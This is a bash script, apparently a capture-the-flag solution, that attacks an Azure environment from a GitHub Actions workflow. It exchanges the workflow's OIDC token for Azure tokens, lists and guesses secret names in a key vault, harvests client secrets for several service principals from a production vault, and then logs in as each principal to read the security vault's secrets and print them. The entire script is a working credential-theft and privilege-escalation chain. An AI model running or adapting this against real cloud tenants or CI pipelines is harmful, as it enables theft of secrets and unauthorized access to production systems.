#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RGV=rg-tbl-platform-prod-sea
MGMT="https://management.azure.com"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
PMG=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')

echo "=== kv-tbl-sec secret NAMES via ARM management (Reader) ==="
RAW=$(curl -sS $M -H "Authorization: Bearer $PMG" "$MGMT/subscriptions/$SUB/resourceGroups/$RGV/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01")
echo "$RAW" | jq -r 'if .error then "ARM-ERR:"+.error.code else (.value[]?.name) end'
NAMES=$(echo "$RAW" | jq -r '.value[]?.name' 2>/dev/null)
# fallback guesses if listing empty
[ -z "$NAMES" ] && NAMES=$'flag\nflag-prod\nthe-flag\nctf-flag\nreporting-writer-secret\nadmin\nroot'

# build vault tokens for all principals
declare -A TOK
TOK[pipeline]="$KV"
for name in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/$name?api-version=7.4" | jq -r '.value // empty')
  appId=$(printf '%s' "$J"|jq -r '.appId//.clientId//empty'); sec=$(printf '%s' "$J"|jq -r '.clientSecret//.password//.secret//empty'); ten=$(printf '%s' "$J"|jq -r '.tenant//.tenantId//empty'); [ -z "$ten" ] && ten=$AZURE_TENANT_ID
  TOK[$name]=$(curl -sS $M -X POST "https://login.microsoftonline.com/$ten/oauth2/v2.0/token" -d "client_id=$appId" -d "client_secret=$sec" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
done

echo; echo "=== targeted GET of each kv-tbl-sec secret by each principal ==="
FOUND=""
while IFS= read -r s; do
  [ -z "$s" ] && continue
  echo "--- secret: $s ---"
  for p in pipeline cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
    t="${TOK[$p]}"; [ -z "$t" ] && { echo "   [$p] no-token"; continue; }
    r=$(curl -sS $M -H "Authorization: Bearer $t" "$SECKV/secrets/$s?api-version=7.4")
    if printf '%s' "$r" | jq -e '.value' >/dev/null 2>&1; then
      v=$(printf '%s' "$r" | jq -r '.value')
      echo "   [$p] GOT: $v"
      m=$(printf '%s' "$v" | grep -aoE "DF26\{[^}]*\}"); [ -n "$m" ] && FOUND="$FOUND $m"
    else
      echo "   [$p] $(printf '%s' "$r" | jq -rc '.error.code' 2>/dev/null)"
    fi
  done
done <<< "$NAMES"

echo; echo "===== FLAG(S) ====="; echo "${FOUND:-(none found)}"
echo "KVGET DONE"; exit 0
